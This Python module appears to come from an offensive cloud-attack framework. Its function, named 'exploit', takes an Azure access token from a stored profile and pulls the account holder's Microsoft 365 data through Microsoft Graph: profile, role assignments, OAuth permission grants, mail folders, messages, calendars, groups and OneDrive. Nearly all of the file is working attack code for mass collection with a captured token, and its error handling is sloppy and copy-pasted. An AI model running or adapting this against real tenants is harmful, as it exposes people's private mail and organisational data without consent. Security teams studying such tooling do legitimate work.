import json
import sys
import requests
import random
import string
from flask_mongoengine import DoesNotExist
import datetime

from core.database.models import AZURECredentials

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    }
}

global device_code_request_json

description = "This module will try to get as many information on the user's account on O365, based on the its privileges."
aws_command = "No cli command"

def exploit(profile, workspace):
    access_token = profile['azure_access_token']
    all_return_dict = {}

    # --------------------------------------------------
    # Get user's Info
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me",
                           headers={
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer {}'.format(access_token)
                           }).text
                        )
        if "error" in me:
            return {"error": {"error": me["error"]['message']}}
        all_return_dict = me
        
    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's Info
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/appRoleAssignments",
                                     headers={
                                         'Content-Type': 'application/json',
                                         'Authorization': 'Bearer {}'.format(access_token)
                                     }).text
                        )
        if "error" in me:
            pass
        all_return_dict['app_role_assignment'] = me['value']
        
    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's privileges on graph api
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants",
                           headers={
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer {}'.format(access_token)
                           }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['oauth_permissions_grants'] = me['value']
    except Exception as e:
        return {"error": {"error": str(e)}}


    # --------------------------------------------------
    # Get user's Mail
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/mailfolders",
                           headers={
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer {}'.format(access_token)
                           }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['mail_folders'] = me['value']

    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's Mail
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/calendars",
                           headers={
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer {}'.format(access_token)
                           }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['calendars'] = me['value']
    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's Mail
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/memberOf",
                                     headers={
                                         'Content-Type': 'application/json',
                                         'Authorization': 'Bearer {}'.format(access_token)
                                     }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['groups'] = me['value']
    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's Mail
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/drive",
                                     headers={
                                         'Content-Type': 'application/json',
                                         'Authorization': 'Bearer {}'.format(access_token)
                                     }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['drive'] = me
    except Exception as e:
        return {"error": {"error": str(e)}}

    # --------------------------------------------------
    # Get user's Mail
    # --------------------------------------------------
    try:
        me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me/messages",
                                     headers={
                                         'Content-Type': 'application/json',
                                         'Authorization': 'Bearer {}'.format(access_token)
                                     }).text
                        )
        if "error" in me:
            all_return_dict['drive'] = me['error']['message']
        else:
            all_return_dict['messages'] = me['value']
    except Exception as e:
        return {"error": {"error": str(e)}}

    return {
        "userPrincipalName": all_return_dict
    }


